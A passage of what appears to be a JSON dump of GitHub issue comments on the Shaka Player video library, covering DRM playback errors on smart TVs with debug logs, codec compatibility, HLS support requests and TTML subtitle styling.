":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"4d4b0ca25ac158f0b9c1983c517ee2b5\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"4d4b0ca25ac158f0b9c1983c517ee2b5\",\"4d4b0ca25ac158f0b9c1983c517ee2b5\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true},{\"id\":46,\"language\":\"en\",\"primary\":true,\"audio\":{\"id\":15,\"originalId\":\"11\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":1078},\"presentationTimeOffset\":0,\"mimeType\":\"audio/mp4\",\"codecs\":\"mp4a.40.2\",\"bandwidth\":135512,\"encrypted\":true,\"keyId\":\"26470f4296d45d04a9babb442e169800\",\"language\":\"en\",\"label\":null,\"type\":\"audio\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":2,\"closedCaptions\":{}},\"video\":{\"id\":28,\"originalId\":\"27\",\"initSegmentReference\":{\"startByte\":0,\"endByte\":348},\"presentationTimeOffset\":0,\"mimeType\":\"video/webm\",\"codecs\":\"vp9\",\"frameRate\":23.80952380952381,\"bandwidth\":8021323,\"width\":3840,\"height\":1636,\"encrypted\":true,\"keyId\":\"4d4b0ca25ac158f0b9c1983c517ee2b5\",\"language\":\"und\",\"label\":null,\"type\":\"video\",\"primary\":true,\"trickModeVideo\":null,\"emsgSchemeIdUris\":[],\"roles\":[\"main\"],\"channelsCount\":null,\"closedCaptions\":{}},\"bandwidth\":8156835,\"drmInfos\":[{\"keySystem\":\"com.widevine.alpha\",\"licenseServerUri\":\"https://cwip-shaka-proxy.appspot.com/no_auth\",\"distinctiveIdentifierRequired\":false,\"persistentStateRequired\":false,\"videoRobustness\":\"\",\"audioRobustness\":\"\",\"serverCertificate\":{},\"initData\":[{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"26470f4296d45d04a9babb442e169800\"},{\"initDataType\":\"cenc\",\"initData\":{\"0\":0,\"1\":0,\"2\":0,\"3\":167,\"4\":112,\"5\":115,\"6\":115,\"7\":104,\"8\":0,\"9\":0,\"10\":0,\"11\":0,\"12\":237,\"13\":239,\"14\":139,\"15\":169,\"16\":121,\"17\":214,\"18\":74,\"19\":206,\"20\":163,\"21\":200,\"22\":39,\"23\":220,\"24\":213,\"25\":29,\"26\":33,\"27\":237,\"28\":0,\"29\":0,\"30\":0,\"31\":135,\"32\":18,\"33\":16,\"34\":81,\"35\":116,\"36\":83,\"37\":134,\"38\":45,\"39\":66,\"40\":86,\"41\":253,\"42\":139,\"43\":173,\"44\":79,\"45\":88,\"46\":66,\"47\":32,\"48\":4,\"49\":215,\"50\":18,\"51\":16,\"52\":240,\"53\":147,\"54\":126,\"55\":154,\"56\":119,\"57\":200,\"58\":85,\"59\":240,\"60\":166,\"61\":212,\"62\":56,\"63\":100,\"64\":197,\"65\":217,\"66\":243,\"67\":101,\"68\":18,\"69\":16,\"70\":77,\"71\":75,\"72\":12,\"73\":162,\"74\":90,\"75\":193,\"76\":88,\"77\":240,\"78\":185,\"79\":193,\"80\":152,\"81\":60,\"82\":81,\"83\":126,\"84\":226,\"85\":181,\"86\":18,\"87\":16,\"88\":144,\"89\":42,\"90\":5,\"91\":26,\"92\":107,\"93\":54,\"94\":86,\"95\":174,\"96\":172,\"97\":25,\"98\":38,\"99\":252,\"100\":15,\"101\":93,\"102\":146,\"103\":50,\"104\":18,\"105\":16,\"106\":38,\"107\":71,\"108\":15,\"109\":66,\"110\":150,\"111\":212,\"112\":93,\"113\":4,\"114\":169,\"115\":186,\"116\":187,\"117\":68,\"118\":46,\"119\":22,\"120\":152,\"121\":0,\"122\":26,\"123\":13,\"124\":119,\"125\":105,\"126\":100,\"127\":101,\"128\":118,\"129\":105,\"130\":110,\"131\":101,\"132\":95,\"133\":116,\"134\":101,\"135\":115,\"136\":116,\"137\":34,\"138\":22,\"139\":115,\"140\":104,\"141\":97,\"142\":107,\"143\":97,\"144\":95,\"145\":99,\"146\":101,\"147\":99,\"148\":53,\"149\":98,\"150\":102,\"151\":102,\"152\":53,\"153\":100,\"154\":99,\"155\":52,\"156\":48,\"157\":100,\"158\":100,\"159\":99,\"160\":57,\"161\":72,\"162\":227,\"163\":220,\"164\":149,\"165\":155,\"166\":6},\"keyId\":\"4d4b0ca25ac158f0b9c1983c517ee2b5\"}],\"keyIds\":[\"26470f4296d45d04a9babb442e169800\",\"4d4b0ca25ac158f0b9c1983c517ee2b5\",\"4d4b0ca25ac158f0b9c1983c517ee2b5\"]}],\"allowedByApplication\":true,\"allowedByKeySystem\":true}]}\nChoosing new streams after period changed\n(all) Stream 9 is being or has been set up\nload() failed:shaka.util.Error {\n  \"severity\": 2,\n  \"category\": 7,\n  \"code\": 7001,\n  \"data\": [],\n  \"handled\": false,\n  \"message\": \"Shaka Error PLAYER.OPERATION_ABORTED ()\",\n  \"stack\": \"Error: Shaka Error PLAYER.OPERATION_ABORTED ()\\n    at\nError (native)\\n    at new shaka.util.Error\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:97:794)\\n\n   at e (https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:110:125)\\n\n   at null.onAbort_\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:111:167)\\n\n   at shaka.util.AbortableOperation.abort\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:108:87)\\n\n   at https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:116:750\\n\n   at Array.forEach (native)\\n    at\nshaka.util.OperationManager.destroy\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:116:688)\\n\n   at shaka.dash.DashParser.stop\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:521:294)\\n\n   at shaka.Player.cancelLoad_\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:879:149)\"\n}Shaka Error PLAYER.OPERATION_ABORTED ()Error: Shaka Error\nPLAYER.OPERATION_ABORTED ()\n    at Error (native)\n    at new shaka.util.Error\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:97:794)\n    at e (https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:110:125)\n    at null.onAbort_\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:111:167)\n    at shaka.util.AbortableOperation.abort\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:108:87)\n    at https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:116:750\n    at Array.forEach (native)\n    at shaka.util.OperationManager.destroy\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:116:688)\n    at shaka.dash.DashParser.stop\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:521:294)\n    at shaka.Player.cancelLoad_\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:879:149)\nload() interrupted\nTimeout waiting for session close\nload() failed:TypeError: Cannot read property 'catch' of\nundefinedCannot read property 'catch' of undefinedTypeError: Cannot\nread property 'catch' of undefined\n    at shaka.media.DrmEngine.destroy\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:152:243)\n    at https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:956:187\nPlayer errorTypeError: Cannot read property 'catch' of undefined. @vaage  I'm going to try it on Tuesday and I'll tell you the result. Thanks!. New log:\nMounting v3 idb storage cell\nMounting session ID idb storage cell\nUnload latency:0.083\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nDropping variant - audio not compatible with platformtype=audio\ncodecs=opus bandwidth=134157 channelsCount=2\nFound variant with audio and video content, so filtering out\naudio-only content in all periods.\nload() failed:shaka.util.Error {\n  \"severity\": 2,\n  \"category\": 6,\n  \"code\": 6002,\n  \"data\": [\n    \"Failed to initialize CDM. (0)\"\n  ],\n  \"handled\": false,\n  \"message\": \"Shaka Error DRM.FAILED_TO_CREATE_CDM (Failed to\ninitialize CDM. (0))\",\n  \"stack\": \"Error: Shaka Error DRM.FAILED_TO_CREATE_CDM (Failed to\ninitialize CDM. (0))\\n    at Error (native)\\n    at new\nshaka.util.Error\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:97:794)\\n\n   at null.\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:176:51)\"\n}Shaka Error DRM.FAILED_TO_CREATE_CDM (Failed to initialize CDM.\n(0))Error: Shaka Error DRM.FAILED_TO_CREATE_CDM (Failed to initialize\nCDM. (0))\n    at Error (native)\n    at new shaka.util.Error\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:97:794)\n    at null.\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:176:51)\nPlayer errorshaka.util.Error {\n  \"severity\": 2,\n  \"category\": 6,\n  \"code\": 6002,\n  \"data\": [\n    \"Failed to initialize CDM. (0)\"\n  ],\n  \"handled\": false,\n  \"message\": \"Shaka Error DRM.FAILED_TO_CREATE_CDM (Failed to\ninitialize CDM. (0))\",\n  \"stack\": \"Error: Shaka Error DRM.FAILED_TO_CREATE_CDM (Failed to\ninitialize CDM. (0))\\n    at Error (native)\\n    at new\nshaka.util.Error\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:97:794)\\n\n   at null.\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:176:51)\"\n}\nPlayer errorshaka.util.Error {\n  \"severity\": 2,\n  \"category\": 3,\n  \"code\": 3016,\n  \"data\": [\n    4,\n    null,\n    null\n  ],\n  \"handled\": false,\n  \"message\": \"Shaka Error MEDIA.VIDEO_ERROR (4,,)\",\n  \"stack\": \"Error: Shaka Error MEDIA.VIDEO_ERROR (4,,)\\n    at Error\n(native)\\n    at new shaka.util.Error\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:97:794)\\n\n   at shaka.Player.onVideoError_\n(https://nightly-dot-shaka-player-demo.appspot.com/dist/shaka-player.ui.debug.js:996:205)\"\n}. @vaage , Before your change, I could play an encrypted video and then it failed. Now it fails with the first video.. I\u2019m using \u201cSintel 4k (multicodec, Widevine)\u201d (Demo asset)\nIt\u2019s reproducible with WebOS 3.5 (often) and Tizen 3 (rarely). @joeyparrish / @vaage , I just retested with LG support and now with the change it works!\nLG\nModel: 43UJ670V-ZD\nFirmware: 05.80.10\nThis model use WebOS 3.5 according to http://webostv.developer.lge.com/discover/webos-tv-platform/web-engine/ is based in Chromium 38\nMSE/EME included in WebOS 3.5 (http://webostv.developer.lge.com/discover/webos-tv-platform/supported-media-formats/):\n\nNote: with firmware 04.70.50 the problem doesn't happen \nWhat happened?\nWith v2.5-beta2:\n- Open the browser integrated in WebOS (SmartTV LG)\n- Open https://v2-5-0-beta-dot-shaka-player-demo.appspot.com\n- Load \"Sintel 4k (multicodec, Widevine)\"\n- You can see the video without problem\n- Unload\n- Load again \"Sintel 4k (multicodec, Widevine)\"\n- You can see \"Cannot read property 'catch' of undefined\"\nWith nightly version with the commit https://github.com/google/shaka-player/commit/cb4e35229b8d5d7c00a530230b2b8b4a8cd5dd57 applied\n- Open the browser integrated in WebOS (SmartTV LG)\n- Open https://nightly-dot-shaka-player-demo.appspot.com\n- Load \"Sintel 4k (multicodec, Widevine)\"\n- You can see \"6002 - Failed to initialize CDM. (0)\"\nSo far is the problem reported before.\nHow has it been solved?\nMake a factory reset of TV.\nRetest:\n- With v2.5-beta2 and previous versions, the error is the same\n- With nightly version with the commit https://github.com/google/shaka-player/commit/cb4e35229b8d5d7c00a530230b2b8b4a8cd5dd57 applied, it works as expected.\nSamsung\nModel: UE40MU6105\nFirmware: 1250.5\nWhat happened?\nWith v2.5-beta2:\n- Open the browser integrated in Tizen (SmartTV Samsung)\n- Open https://v2-5-0-beta-dot-shaka-player-demo.appspot.com\n- Load \"Sintel 4k (multicodec, Widevine)\"\n- You can see the video without problem\n- Unload\n- Load again \"Sintel 4k (multicodec, Widevine)\"\n- You can see \"Cannot read property 'catch' of undefined\"\nWith nightly version with the commit https://github.com/google/shaka-player/commit/cb4e35229b8d5d7c00a530230b2b8b4a8cd5dd57 applied\n- Open the browser integrated in Tizen (SmartTV Samsung)\n- Open https://nightly-dot-shaka-player-demo.appspot.com\n- Load \"Sintel 4k (multicodec, Widevine)\"\n- You can see \"6002 - Failed to initialize CDM. (0)\"\nThe error is reproduced 1% of the time\nHow has it been solved?\nI updated the firmware to 1260.6 \n- With v2.5-beta2 and previous versions, the error is the same\n- With nightly version with the commit https://github.com/google/shaka-player/commit/cb4e35229b8d5d7c00a530230b2b8b4a8cd5dd57 applied, it works as expected.\nConclusion\nWith the previous comments, I consider that the problem is resolved. Thanks @vaage\n@joeyparrish, this fix can be included in v2.5.0-beta 3? Do you have any ETA for v2.5.0-beta3?. @joeyparrish Do you have any ETA for v2.5.0-beta3?. I suspect that the problem is similar to https://github.com/google/shaka-player/issues/1704. @vaage , Is it possible isolate transmuxing logic into worker (https://caniuse.com/#search=web%20workers) inside Shaka Player?. I just tested with link removed and the fix for https://github.com/google/shaka-player/pull/1820 and I don't see the stall in webos. \nStill, I think it would be nice to move mux.js to a worker.. @vaage web workers are different than service workers. See https://bitsofco.de/web-workers-vs-service-workers-vs-worklets/. https://storage.googleapis.com/shaka-demo-assets/sintel-widevine/dash.mpd\nUsing:\nvideo codec: vp9\naudio codec: opus \nsubtitle: text/vtt. I just checked with .mkv with vp9 and opus and it works. In my opinion, i think that the problem is related with the MSE implementation with these codecs. I just tested with VP9 and Vorbis and all it's fine.. Your table is correct.\nMSE --> VP9+OPUS = FAIL\nSRC --> VP9+OPUS(MKV) = PASS\nMSE --> VP9+VORBIS = PASS.  I'm on vacation until the 18th. On my return I can prove it!. Only it's a question, your response it's enough. Thanks!. @joeyparrish I update the comment with your suggestion (that is the real problem). thanks for your info @skipness . Thanks @joeyparrish . I can reproduce the issue with v2.5.0-beta3 \nAccording the drm provider in v2.0.3 the issue doesn't happen due to changes in the pssh.. I just tested with Edge 18 in v2.02, v2.0.3 and v2.5.0-beta3 and It doesn't work.\nWith Edge 15 works in 2.02, v2.0.3 but not in v2.5.0-beta3\nIt a bit curious.... Note: the same manifest with Widevine in Chrome/Firefox/Opera work without problem.. The stream works with http://reference.dashif.org/dash.js/v2.9.3/samples/dash-if-reference-player/index.html \nSo, I think that is not a browser error. > @avelad I would be interested in knowing more about the pssh changes you mention. Could you reach out to me? johnsim@microsoft.com\n@cristioltean ,in this comment you have the mail.. ",
    "raskri": "Any news on the ETA for HLS support in Shaka?\n. Why is this not a bug? As the stream is stuttering in Chrome and not in Firefox.\n. Thanks Joey!. Map the buttons?\nvar playPause = document.getElementById('playPauseButton');\nplayPause.on('click', function(){\ndocument.getElementById('video').pause();\n});\n...\n. I really cant change anything on the server, as it works for 1.6.5 it should work with 2.0.0.\n. Thanks for the info Joey!\n. @joeyparrish, using (!!window.VTTCue||!!window.TextTrackCue) works for my case(for now). \nI'm planning to upgrade to v2, I just need to get the clockSync working for my dash streams.\nThanks. Is there a way to make bufferingGoal override the manifests minBufferTime? In my manifest it is set to minBufferTime = 10 sec. Which always makes my player wait for about 10 sec, and then it plays. But I get the first \"image\" of the stream right away.. ",
    "bulkinav": "Hi,\nCan you give rough timing of the HLS implementation? One month, two months, half year?\nOur service uses the HLS and Widevine Modular, and we very want use a one player for this. Shaka player is good solution, but without HLS is difficult for us.. ",
    "forbesjo": "@joeyparrish any thoughts on using https://github.com/videojs/m3u8-parser?. I can see that there's a new API for selecting by audio language while keeping the ABR active, but I don't see how the role of the audio track is taken into account? How would a user enable a commentary track?. Yep, I've taken that into account in the Shaka/dash.js compatible video.js plugin I'm working on. https://github.com/videojs/mux.js is another library you could look at (I may be biased).. mux.js follows semver so there will only be breaking changes in major versions.  I would only advise users to use specific versions if they prefer certainty or reproducible builds over automatic updates.\nRight now updates aren't communicated beyond watching the repo but we plan on announcing updates in the #announcements channel in http://slack.videojs.com/ as well as posting change log notes to Github releases.. Users can also be directed to the video.js #playback channel for questions/information that doesn't fit in a Github issue.. Just wanted to add a note for this dropped frames ABR feature. In Edge it seems like dropped and total frames from getVideoPlaybackQuality reset to 0 on seeks. This occurs in regular MP4s as well so this isn't an MSE-only issue. . Sounds similar to https://github.com/google/shaka-player/issues/890 is resolved with https://github.com/google/shaka-player/commit/4aa2430a1b6cae7331cb6b2a51c0faea0dad82c4. Note that this source has never played through to the end in any version of the Shaka Player. It does in dash.js and native Edge playback.. My mistake, looks like this was just implemented with https://github.com/google/shaka-player/commit/b3586c193a19f065bb17cf42d6b4acca35c6733c. That makes sense, I\u2019ll handle preload in my app and selectively load the source. Closing this issue.  . Signed the CLA. Great thanks for the comments!. This PR is still on my radar but other work has taken priority. Thanks for the ping, I'll be taking a look at this PR and cleaning it up some time soon. Update on this PR, I don't think I'll have time to clean up the PR. If any other user would like to implement this feature in Shaka feel free to use this as a starting point. Feel free to close if necessary.. We're actually planning this quarter on parsing fmp4 608/708 in mux.js in order to handle fmp4 HLS and DASH. Stay tuned!. @avelad yes that should be supported. This is the mux.js PR for reference https://github.com/videojs/mux.js/pull/197. ",
    "birme": "I wouldn't mind contributing to the TS remuxing as I have some experience in parsing TS-packets and PES data in Javascript. I assume you intend to repackage AVC+AAC in TS to AVC+AAC in MP4-boxes that the media source can handle?. Ok, so no TS support on Chrome/Firefox in the library?. One use case I have been working with is to repackage HLS with SCTE35 base encoded data to multi period MPEG DASH [1] where I add \nxmlns:scte35=\"urn:scte:scte35:2014:xml+bin\"\nto MPD root element and then adds an EventStream with this payload:\n<Period id=\"2470350023\" start=\"PT27448.333589S\">\n    <EventStream timescale=\"90000\" schemeIdUri=\"urn:scte:scte35:2014:xml+bin\">\n      <Event duration=\"21690000\" id=\"1\">\n       <scte35:Signal>\n         <scte35:Binary>\n           /DAlAAAAAAAAAP/wFAUAAAAEf+/+kybGyP4BSvaQAAEBAQAArky/3g==\n         </scte35:Binary>\n       </scte35:Signal>\n      </Event>\n    </EventStream>\nIt would be great if this use case also could be supported and I am happy to contribute with a PR if it sounds like a good idea to support.\n[1] https://github.com/Eyevinn/hls-to-dash\n. @sandersaares: Yes, correct. It requires in addition to the DRM-technology-specific part this key ID and that is used for internal lookup before it proxies the license request to the license server. I think it is used for caching purposes but that is an area where I don't have the insights in\n. Thank you for the feedback. I will correct these things\n. No probs, fixed that last thing now\n. Chrome 53.0.2785 (Mac OS X 10.10.5): Executed 891 of 927 (skipped 36) SUCCESS (6 mins 11.643 secs / 7 mins 27.425 secs)\n. Sorry, thought I did a lint check before pushing. Will fix\n. Ok, thanks for the answer.\n. I can add that I have also had rounding issues with our hls2dash [1] and had to be very careful not to lose any digits when calculating both start times and durations. \n[1] https://github.com/Eyevinn/hls-to-dash\n. With this option it would extract the text payload (including any TTML styling) and strip out the TTML styling elements and create a new text payload with a default TTML styling applied.\n. @joeyparrish: Let us assume that we have one single ISOBMFF box with this TTML payload:\n<tt \n xmlns=\"http://www.w3.org/ns/ttml\" xmlns:ttp=\"http://www.w3.org/ns/ttml#parameter\"\n xmlns:tts=\"http://www.w3.org/ns/ttml#styling\" ttp:timeBase=\"media\" xml:lang=\"en\"\n ttp:cellResolution=\"50 30\">\n    <head>\n        <styling>       \n            <style xml:id=\"spanStyle\" tts:color=\"#ffffff\" tts:backgroundColor=\"#000000\" tts:fontSize=\"160%\" tts:fontFamily=\"monospace\"/>\n            <style xml:id=\"paragraphStyle\" tts:textAlign=\"center\" />\n        </styling>\n        <layout>\n            <region xml:id=\"bottom\" tts:origin=\"10% 10%\" tts:extent=\"80% 80%\" tts:displayAlign=\"after\" />\n        </layout>\n    </head>\n    <body>\n        <div>\n            <p xml:id=\"subtitle1\" region=\"bottom\" begin=\"00:00:10.000\" end=\"00:00:20.000\" style=\"paragraphStyle\">\n                <span style=\"spanStyle\">One line Subtitle.</span>\n            </p>\n        </div>\n    </body>\n</tt>\nIn our case the <layout> and <styling> portion are incorrect and what I want is that before it is feed to the browser it can be replaced with a \"default\" TTML layout block. I can agree that this might be a special case but similar to ExoPlayer it would be great to have a function to \"clean\" bad or incorrect styling.\nIf you don't think this is an entirely stupid thing I could make a PR with a proposal on how to solve this.\n. I think you can actually close this one. I've solved the problem with a PR that fixed some of the issues with  in ttml was not handled correctly and some alignment issues\n. No probs. Done!\n. Yes I have. My name is Jonas Birm\u00e9 and I believe I am already in the CONTRIBUTORS list\n. Replaced by #591 \n. Hmm... my git skills are not that high. Not sure I got the rebase stuff right here...\n. I am not sure either. Let me close this PR and I'll create a new one.\n. Just wanted to check if you have managed to have a look at this PR yet?. Yes, this is needed. This is about positioning the actual cue box (VTTRegion). Thanks for reviewing this @joeyparrish and for the feedback. I will try to implement the suggested changes in a couple of days (most probably after christmas). Alright @joeyparrish, I have reworked this implementation a bit based on your feedback. Moving it out to the TextEngine was a great suggestion! \nThe reason why I created a polyfill for the VTTRegion implementation was that it is specified in the VTTCue documentation [1] but I have to admit that I have not found a browser that implements this yet.\n[1] https://w3c.github.io/webvtt/#the-vttregion-interface . Ok, I've done some smaller cleanups and updating some unit tests but feel fairly finished by now and looking forward for your feedback @joeyparrish.. Replaced by #647. @hghazzi: Looking at the manifest you have the AvailabilityStartTime = 2016-11-30T20:22:52 (1480537372 as unix TS). The first segment interpreted in seconds (109017062370 / 90000) = 1211300.693 which would then correspond to 1480537372 + 1211300.693 = 1481748672.693 = 2016-12-14T20:51:00.\nWas it expected that the first segment corresponds to that time in your live (I presume) stream? If that is the case I suspect the clock on your computer was not in synch with the encoder/server.\nShaka 2.x provides a way to provide an endpoint if the UTCTiming is not included in the manifest by specifying a clockSyncUri in manifest configuration: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#DashManifestConfiguration\nTry specify a clockSyncUri endpoint there (could be the same as the manifest URI) and see if it works better. Requires that the Date header is available in a HEAD request (and also exposed in case of CORS restrictions).. @joeyparrish: have you had any chance to consider this PR?. On a side note: This could also be achieved server-side to avoid having to re-implement this on every device platform. Something we developed as a proof-of-concept and made available as open source: https://eyevinn.github.io/channel-engine/\nWith that said, the proposed method would still be cool and nifty feature to have in Shaka.. Oh, of course. Very sorry about this. Don't know what I was thinking. Will fix this of course\n. To be honest I haven't tested with a lower precision so I don't know if all of these digits are required\n. I did a test and it seems that Jasmine requires full precision here.\n. Good point!\n. Sure, done!\n. The problem was that cue.align on Chrome does not support setting it as \"center\" though it should be valid. And using cue.align as \"middle\" doesn't have any effect without setting cue.position as auto. According to spec \"auto\" or a number should be a valid setting. If you can get it to center it on Chrome in another way I am happy to understand how. What happens without cue.position=auto is that the text is centered but on the left side of the screen. The most correct way probably but not supported from what I can see is to use VTTRegion\n. Yes exactly\n. Great that they could confirm the cue.align issue. When thinking about this a bit more the cue.position might be working as intended however the difficult thing is that cue.position has a centered anchor when cue.align is middle/centered and that might very well be according to spec. And when cue.align is left aligned the cue.position anchor is to the left. In TTML they have separated this where you can define a cue box region with a size and position. For example position 2 would put the region 2 units from the left. And then having textAlign=centered would place the text centered within that box. So, when translating this from a TTML space to a VTT space I had to set position as \"auto\" to give the same effect.\nIf I have understood the vtt spec a similar concept is specified with VTTRegion however that is not yet supported in Chrome as far as I can see.\n. Sorry, forgot to answer the sample request. I don't think it will be possible to share due to drm and geoblocking issues. However if you for example set 